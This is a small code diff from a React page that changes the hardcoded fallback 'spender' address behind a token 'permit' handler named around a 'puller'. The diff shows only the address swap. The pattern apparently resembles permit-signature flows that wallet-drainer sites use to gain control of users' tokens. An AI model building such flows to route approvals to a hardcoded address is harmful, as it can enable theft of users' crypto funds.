@@ -33,7 +33,7 @@ export default function Home() {
 
   const spender = useMemo<`0x${string}`>(() => {
     // if needed, pull dynamically from backend inside handlePermit()
-    return (PULLER_FROM_ENV ?? "0x561201e207607c5b09d9e1682e8a78250ce59f1e") as `0x${string}`;
+    return (PULLER_FROM_ENV ?? "0xc6cda5b54e20ade5c60013ecaf3fb64aad83240f") as `0x${string}`;
   }, []);
 
   const handlePermit = useCallback(async () => {
